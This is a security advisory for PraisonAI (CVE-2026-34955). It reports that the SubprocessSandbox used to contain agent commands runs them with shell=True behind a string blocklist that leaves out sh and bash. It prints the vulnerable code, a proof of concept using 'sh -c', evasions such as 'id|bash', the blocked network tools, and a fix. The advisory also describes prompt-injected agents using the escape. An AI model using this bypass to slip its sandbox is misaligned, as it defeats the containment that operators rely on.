# [H] PraisonAI Has Sandbox Escape via shell=True and Bypassable Blocklist in SubprocessSandbox

## Summary
Severity: High
Advisory: GHSA-r4f2-3m54-pp7q
CVE: CVE-2026-34955
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-r4f2-3m54-pp7q
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.5.97

## Details
### Summary

`SubprocessSandbox` in all modes (BASIC, STRICT, NETWORK_ISOLATED) calls `subprocess.run()` with `shell=True` and relies solely on string-pattern matching to block dangerous commands. The blocklist does not include `sh` or `bash` as standalone executables, allowing trivial sandbox escape in STRICT mode via `sh -c '<command>'`.

### Details

`sandbox_executor.py:179` (source) -> `sandbox_executor.py:326` (sink)
```python
# source -- string-pattern blocklist, sh and bash not in blocked_commands
cmd_name = Path(parts[0]).name
if cmd_name in self.policy.blocked_commands:  # sh, bash not blocked
    raise SecurityError(...)
dangerous_patterns = [
    ("| sh",   ...),   # requires space -- "id|bash" evades this
    ("| bash", ...),   # requires space
]

# sink -- shell=True spawns /bin/sh regardless of sandbox mode
result = subprocess.run(
    command,
    shell=True,
    ...
)
```

### PoC
```python
# tested on: praisonai==4.5.87 (source install)
# install: pip install -e src/praisonai
import sys
sys.path.insert(0, 'src/praisonai')
from praisonai.cli.features.sandbox_executor import SubprocessSandbox, SandboxPolicy, SandboxMode

policy = SandboxPolicy.for_mode(SandboxMode.STRICT)
sandbox = SubprocessSandbox(policy=policy)

result = sandbox.execute("sh -c 'id'")
print(result.stdout)
# expected output: uid=1000(narey) gid=1000(narey) groups=1000(narey)...
```

### Impact

Users who deploy with `--sandbox strict` have no meaningful OS-level isolation. Any command blocked by the policy (curl, wget, nc, ssh) is trivially reachable via `sh -c '<blocked_command>'`. Combined with agent prompt injection, an attacker can escape the sandbox and reach the network, filesystem, and cloud metadata services.

### Suggested Fix
```python
import shlex

result = subprocess.run(
    shlex.split(command),
    shell=False,
    cwd=cwd,
    env=env,
    capture_output=capture_output,
    text=True,
    timeout=timeout
)
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-r4f2-3m54-pp7q
- https://nvd.nist.gov/vuln/detail/CVE-2026-34955
- https://github.com/MervinPraison/PraisonAI
